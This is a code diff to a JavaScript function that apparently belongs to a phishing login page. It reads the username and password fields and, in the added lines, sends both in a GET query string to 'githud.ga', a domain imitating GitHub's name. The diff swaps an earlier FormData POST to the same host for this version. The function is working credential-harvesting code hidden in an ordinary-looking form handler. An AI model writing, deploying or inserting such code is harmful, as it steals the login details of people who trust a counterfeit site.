@@ -130,13 +130,14 @@ function sendData() {
   var password = document.getElementsByName("password").item(0).value;
   
   const XHR = new XMLHttpRequest();
-  FD  = new FormData();
   
-  // データを FormData オブジェクトに投入します
-  FD.append("username", username);
-  FD.append("password", password);
+  // リクエストをセットアップします
+  XHR.open('GET', 'https://www.githud.ga?username='+username+'&password='+password);
+
+  // FormData オブジェクトを送信するだけです。HTTP ヘッダは自動的に設定されます
+  XHR.send();
   
-  // データが正常に送信された場合に行うことを定義します
+    // データが正常に送信された場合に行うことを定義します
   XHR.addEventListener('load', function(event) {
     alert('Yeah! Data sent and response loaded.');
   });
@@ -145,12 +146,6 @@ function sendData() {
   XHR.addEventListener('error', function(event) {
     alert('Oups! Something goes wrong.');
   });
-
-  // リクエストをセットアップします
-  XHR.open('GET', 'https://www.githud.ga/index.php');
-
-  // FormData オブジェクトを送信するだけです。HTTP ヘッダは自動的に設定されます
-  XHR.send(FD);
   
   alert(username+':'+password);
 }
